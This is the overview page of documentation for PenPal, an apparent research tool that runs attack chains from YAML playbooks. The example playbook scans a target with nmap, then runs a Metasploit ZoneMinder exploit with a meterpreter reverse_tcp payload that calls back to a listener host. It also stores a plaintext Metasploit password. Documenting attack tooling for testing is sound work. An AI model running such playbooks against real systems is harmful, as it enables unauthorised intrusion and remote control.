.. _Overview:

========
Overview
========

PenPal ships with a executable stub called "penpal" that can be called like follows:

.. code-block::

   penpal -h
   usage: penpal [-h] --config CONFIG [--debug] [--version]

   PenPal is an attack orchestration tool that executes full attack-chains based on playbooks.

   options:
     -h, --help       show this help message and exit
     --config CONFIG  Attack-Playbook in yaml-format
     --debug          Enable verbose output
     --version        show program's version number and exit

   (Austrian Institute of Technology) https://aecid.ait.ac.at Version: 0.1.0

The configuration-file is in yaml-format. The following yaml-file is an example of a playbook.yml:

.. code-block:: yaml

   ###

   vars:
     $SERVER_ADDRESS: 192.42.0.254

   cmd_config:
     loop_sleep: 5

   msf_config:
     password: hackhelfer
     server: 10.18.3.86

   commands:
     - type: shell
       cmd: nmap $SERVER_ADDRESS
       error_if: .*test.*

     - type: msf-module
       cmd: exploit/unix/webapp/zoneminder_snapshots
       creates_session: "foothold"
       options:
         RHOSTS: 192.42.0.254
       payload_options:
         LHOST: 192.42.2.253
       payload: cmd/unix/python/meterpreter/reverse_tcp
